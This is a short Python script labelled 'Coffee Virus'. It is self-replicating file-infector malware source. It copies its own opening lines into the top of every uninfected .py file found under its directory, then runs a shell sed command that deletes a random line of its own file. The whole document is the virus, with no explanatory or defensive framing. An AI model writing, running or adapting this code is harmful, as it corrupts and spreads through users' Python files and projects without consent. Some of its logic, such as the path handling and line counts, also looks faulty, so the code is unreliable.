s="-=-Coffee Virus-=-"
import os,fnmatch
path = (os.path.abspath(__file__)).strip(str(__file__))
v=open(__file__,"r").readlines()[:12]
for root,dirs,files in os.walk(path):
	for f in fnmatch.filter(files,"*.py"):
		p = open((os.path.abspath(os.path.join(root,f))),"r+").readlines()
		if not p[0].startswith("s=\"-=-Coffee Virus-=-\""):
			open((os.path.abspath(os.path.join(root,f))),"r+").writelines(v+["\n"]+p)
cmd="sed -i $((13 + RANDOM % {}))d {}".format(len(v),str(__file__))
os.popen(cmd,"r",1)
